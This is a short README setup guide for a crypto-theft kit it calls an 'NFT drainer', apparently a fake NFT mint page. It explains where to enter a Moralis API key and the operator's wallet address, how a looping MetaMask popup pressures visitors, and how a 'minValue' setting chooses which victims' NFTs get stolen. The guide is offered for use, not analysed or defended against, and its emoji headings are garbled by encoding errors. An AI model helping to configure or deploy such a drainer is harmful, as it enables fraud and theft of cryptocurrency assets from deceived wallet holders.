# üñçÔ∏è Setup Guide: 
you need to edit the **settings.js** file.

- line 3: const moralisApi = `"X-API-KEY";` replace **X-API-KEY with your Moralis web3 api key**
# üñçÔ∏è For wallet
you need to edit the **assets/js/wallet.js** file
- line 10: const adress = `"YOUR ETH WALLET";` replace **YOUR WALLET with your ETH wallet address.**

  - Also, line after "const mintInfo" will change the minting price, the maximum supply, the minimum to be minted if the person doesn't have any NFTs, the maximum to be minted...
  - Line "askMintLoop: true" = metamask popup will open again and again until the popup is closed.

# ‚òÅÔ∏è Important : 

- Lines after **"const drainNftsInfo"** will be used for the NFT drainer.
- Edit lines : nftReceiveAddress: "YOUR ETH WALLET", replace YOUR WALLET with your ETH wallet address in assets/js/wallet.js"
- Line "minValue: 0.2," is the minimum value of a NFT before it gets stolen. Exemple : If you change this value to 1, the script will only steal NFTs that have a value higher to 1.
